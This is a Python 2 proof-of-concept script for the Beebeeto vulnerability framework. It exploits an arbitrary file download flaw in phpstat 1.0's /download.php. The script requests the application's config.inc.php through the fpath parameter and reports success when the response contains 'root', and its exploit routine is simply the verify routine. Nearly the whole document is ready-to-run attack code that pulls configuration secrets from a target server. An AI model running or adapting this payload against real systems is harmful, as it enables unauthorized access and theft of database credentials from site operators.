#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0162',
            'name': 'phpstat 1.0 /download.php 任意文件下载 POC',
            'author': 'jwong',
            'create_date': '2014-11-24',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'phpstat',
            'vul_version': ['1.0'],
            'type': 'Arbitrary File Download',
            'tag': ['phpstat漏洞', '任意文件下载', '/download.php', 'php'],
            'desc': 'phpstat v1.0.20141124 /download.php 任意文件下载。',
            'references': ['http://0day5.com/archives/2372',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '/download.php?fname=1.txt&fpath=./include.inc/config.inc.php'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if 'root' in content:
            args['success'] = True
            args['poc_ret']['vul_url']= verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())